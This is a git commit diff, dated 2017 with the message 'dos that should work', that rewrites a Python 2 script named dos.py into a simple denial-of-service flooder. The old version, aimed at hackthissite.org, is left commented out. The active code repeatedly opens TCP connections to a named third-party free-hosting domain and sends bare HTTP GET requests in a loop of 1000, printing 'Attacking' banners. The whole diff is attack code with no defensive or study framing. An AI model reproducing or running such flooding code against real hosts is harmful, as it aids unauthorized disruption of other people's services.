1f8238f83b967f2b33708ddb42f5bb6fb416641e
Menny <mennykizer15@gmail.com>
2017-12-26 17:43:39 +0200

    dos that should work

--- dos.py
+++ dos.py
@@ -1,25 +1,42 @@
+
 import socket
 import os
 import sys
 import time
-
-host = 'www.hackthissite.org'
+"""
+host = 'ympt.000webhostapp.com'
 message = 'dos'
-conn = 1000
-ip = socket.gethostbyname(host)
 
+ip = socket.gethostbyname(host)
+i = 0
 
 def attack():
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    sock.connect((host, 80))
     sock.send(message)
     print sock.recv(20)
 
-    sock.close()
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((host, 80))
 
-for i in range(1, conn):
+for i in range(0,1000000):
     print i
+    attack()
+
+
+
+sock.close()"""
+import socket, sys, os
+IP = "ympt.000webhostapp.com"
+message = "hi"
+print "][ Attacking " + IP  + " ... ]["
+print "injecting " + message;
+def attack():
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, 80))
+    print ">> GET /" + message + " HTTP/1.1"
+    s.send("GET /" + message + " HTTP/1.1\r\n")
+    s.send("Host: " + IP  + "\r\n\r\n");
+    s.close()
+for i in range(1, 1000):
     attack()
 
